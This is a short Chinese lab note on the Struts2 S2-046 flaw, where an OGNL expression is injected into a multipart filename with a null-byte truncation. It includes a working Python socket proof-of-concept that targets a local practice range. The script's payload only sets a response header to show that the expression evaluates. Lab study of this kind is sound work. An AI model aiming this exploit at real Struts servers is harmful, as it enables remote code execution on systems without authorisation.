这个靶场和045的漏洞是用一个漏洞但是不同的入口
是将OGNL表达式放进filename

不能用burpsuite
我用ai写了个脚本：
```
#!/usr/bin/env python3
# S2-046 验证:用原生 socket 发畸形 multipart(filename 里带 \x00 截断)
# 验证表达式用"无害的乘法 + 加响应头",不执行命令,便于看证据 ✓
import socket, sys

HOST, PORT = "127.0.0.1", 18080          # ★ 你的靶场映射在 18080,不是 8080 ★
BOUNDARY = "----WebKitFormBoundaryXd004BVJN9pBYBL2"

# ① 验证用表达式:把 233*233 的结果放进响应头 X-Test
#    注意表达式后面紧跟 \x00,这就是"畸形"的来源 ✓
OGNL = ("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
        ".addHeader('X-Test',233*233)}")

# ② multipart body(filename 里嵌表达式 + \x00)
body = (
    '--' + BOUNDARY + '\r\n'
    'Content-Disposition: form-data; name="upload"; filename="' + OGNL + '\x00b"\r\n'
    'Content-Type: text/plain\r\n'
    '\r\n'
    'foo\r\n'
    '--' + BOUNDARY + '--'
).encode('utf-8', 'surrogateescape')

# ③ 请求头(Content-Length 必须按 body 实际字节数算 ✓)
head = (
    'POST / HTTP/1.1\r\n'
    f'Host: {HOST}:{PORT}\r\n'
    'User-Agent: Mozilla/5.0\r\n'
    'Content-Type: multipart/form-data; boundary=' + BOUNDARY + '\r\n'
    f'Content-Length: {len(body)}\r\n'
    'Connection: close\r\n'
    '\r\n'
).encode()

print(f"=== 发送: body {len(body)} 字节, filename 内含 \\x00 ===")
with socket.create_connection((HOST, PORT), timeout=8) as c:
    c.send(head + body)
    data = b""
    while True:
        chunk = c.recv(4096)
        if not chunk: break
        data += chunk

text = data.decode('utf-8', 'replace')
print("=== 响应状态行 ===")
print("  " + text.split("\r\n")[0])
print("=== ★判据:响应头里有没有 X-Test: 54289(=233*233) ★ ===")
for line in text.split("\r\n"):
    if line.lower().startswith("x-test"):
        print("  " + line + "   ← 表达式执行成功 ✓")
        break
else:
    print("  ✗ 没看到 X-Test 头")

```
直接执行即可
